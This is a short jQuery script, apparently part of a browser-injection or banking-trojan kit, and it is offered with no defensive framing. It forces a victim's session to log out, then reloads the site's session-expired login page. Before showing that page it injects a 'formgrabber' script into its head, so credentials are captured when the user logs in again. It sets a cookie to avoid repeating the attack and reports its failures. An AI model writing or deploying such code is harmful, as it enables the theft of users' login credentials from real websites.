$(document).ready(function(){     
   // logout first then reload the html content together with our form grabbing js
   if ($.cookie("formgrabbed")) { notify('form already grabbed'); return true };
   if (typeof(logoutpage) == 'undefined') {
		logoutpage = $('body').find('a[href*="logout"]').attr('href');
   }
   $.get(sessionexpiredpage).success( function(data){
	    $.get(logoutpage).success( function(){	   
		   if (typeof(sessionexpiredpage) == "undefined"){ sessionexpiredpage = document.location };
		   if (sessionexpiredpage.length == 0){ sessionexpiredpage = document.location };
		   $.get(sessionexpiredpage, function(data2)
		         {                             
					form=$(data2).find('form');
					if (typeof(form) == "undefined") {notify('failed to find a form')}
					else
					{    
						var hd = $.htmlDoc(data2);
						var script   = document.createElement("script");
						script.type  = "text/javascript";
						script.text  = formgrabber;
						$(hd).find('head')[0].appendChild(script);
						$('html').html(hd);
					}
				 }
				).error(function(){notify('failed to get session expired page')});
		}).error(function(){notify('failed to get logout page')});
	});
});